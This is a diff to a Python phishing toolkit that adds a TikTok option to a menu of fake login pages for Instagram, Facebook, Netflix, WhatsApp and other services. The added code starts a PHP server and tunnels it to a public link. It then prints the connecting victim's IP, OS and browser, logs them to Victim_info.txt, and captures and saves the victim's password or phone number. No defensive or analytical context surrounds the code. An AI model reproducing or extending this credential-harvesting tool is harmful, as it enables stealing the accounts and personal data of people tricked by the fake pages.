@@ -123,7 +123,7 @@ banner.banner()
 #choices====================================================================================================
 print(f""" 
 
-{Fore.RED}[{Fore.LIGHTGREEN_EX}01{Fore.RED}]{Fore.LIGHTWHITE_EX} Instagram    {Fore.RED}[{Fore.LIGHTGREEN_EX}02{Fore.RED}]{Fore.LIGHTWHITE_EX} Facebook    {Fore.RED}[{Fore.LIGHTGREEN_EX}03{Fore.RED}]{Fore.LIGHTWHITE_EX} Github   {Fore.RED}[{Fore.LIGHTGREEN_EX}07{Fore.RED}]{Fore.LIGHTWHITE_EX} Free Follower
+{Fore.RED}[{Fore.LIGHTGREEN_EX}01{Fore.RED}]{Fore.LIGHTWHITE_EX} Instagram    {Fore.RED}[{Fore.LIGHTGREEN_EX}02{Fore.RED}]{Fore.LIGHTWHITE_EX} Facebook    {Fore.RED}[{Fore.LIGHTGREEN_EX}03{Fore.RED}]{Fore.LIGHTWHITE_EX} Github   {Fore.RED}[{Fore.LIGHTGREEN_EX}07{Fore.RED}]{Fore.LIGHTWHITE_EX} Free Follower   {Fore.RED}[{Fore.LIGHTGREEN_EX}09{Fore.RED}]{Fore.LIGHTWHITE_EX} Tiktok
 
 {Fore.RED}[{Fore.LIGHTGREEN_EX}04{Fore.RED}]{Fore.LIGHTWHITE_EX} Netflix      {Fore.RED}[{Fore.LIGHTGREEN_EX}05{Fore.RED}]{Fore.LIGHTWHITE_EX} Google      {Fore.RED}[{Fore.LIGHTGREEN_EX}06{Fore.RED}]{Fore.LIGHTWHITE_EX} Pubg     {Fore.RED}[{Fore.LIGHTGREEN_EX}08{Fore.RED}]{Fore.LIGHTWHITE_EX} whatsapp
 
@@ -1197,7 +1197,126 @@ def Whatsapp():
     else:
         subprocess.call("sudo pkill php" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
+    
+    
+#option 8 ====================================================================================================
+def Tiktok():
+    global port
+    
+    path = os.getcwd()
+    os.chdir(rf"{path}/Tiktok")
+
+#====================================================================================================
+    try:
+        port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.YELLOW}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET))
+        if port > 65535:
+            exit(f"""{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)
+
+       
+    except KeyboardInterrupt:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+    except EOFError:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+    
+    except ValueError:
+        exit(f"""{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
+#Run Localhost====================================================================================================
+    php_server()
+    
+    sleep(1)
+
+    loaclhost()
+    
+    try:
+        print(" ")
+        rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
+    except KeyboardInterrupt:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
         
+    print("                          " , end="\r")
+#Generate Link====================================================================================================
+
+    line = linecache.getline(r"localhost.txt" , 24)
+    print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
+    sleep(0.1)
+    linecache.clearcache()
+    
+    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
+    
+#Write info====================================================================================================
+    try:
+        while True:
+            size = os.stat("info.json")
+            if size.st_size != 0:
+
+                
+                with open("info.json", "r") as read_file:
+                    data = json.load(read_file)
+
+                    print(Fore.CYAN + "\r\nTarget Ip :" , data["dev"][0]["Os-Ip"])
+                    print("\r\nOs Name :" , data["dev"][0]["Os-Name"])
+                    print("\r\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
+                    
+                    sleep(0.3)
+                    print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Other info's in Victim_info.txt" + Fore.RESET)
+                    
+                    sleep(1)
+                    df = pd.read_json(r"info.json")
+                    sleep(1)
+                    df.to_csv("Victim_info.txt", index=False , mode="a")
+
+                    victim_file= open("Victim_info.txt", "a")
+                    victim_file.write("\n")
+                    sleep(3)
+                    open("info.json" , "w").close()
+                    victim_file.close()
+
+                    #TODO use rotation here
+                    Sprint(Fore.YELLOW + "\r\nWaiting for target info...".title() + Fore.RESET)
+                    break
+
+    except KeyboardInterrupt:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+    
+
+#write Number====================================================================================================
+
+    while True:
+        size = os.stat("Number.txt")
+        if size.st_size != 0:
+            with open("Number.txt" , "r") as pas:
+                sleep(15)
+                print(f"\r{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
+
+                #clear Number.txt
+                pwd =open("Number.txt")  
+                data = open("data.txt","a")
+                for x in pwd.readlines():
+                    data.write(f"\nUser Number is : {x}")
+                    data.write("\n")
+                data.close()
+                sleep(1.5)
+                open("Number.txt" , "w").close()
+                
+                sleep(0.5)
+                print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Number saved in data.txt" + Fore.RESET)
+
+                break
+
+#kill php proccess and exit====================================================================================================
+
+    if os.name == "nt":
+        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
+        sys.exit()
+    else:
+        subprocess.call("sudo pkill php" , stdout=subprocess.DEVNULL , shell=True)
+        sys.exit()    
 #Run functions ====================================================================================================
 if ask == "0":
     zero_exit()
@@ -1230,6 +1349,10 @@ if ask == "7" or ask == "07":
     
 if ask == "8" or ask == "08":
     Whatsapp()
+    
+if ask == "09" or ask == "9":
+    Tiktok()
+
 
 
 if ask == "xx" or ask == "XX":
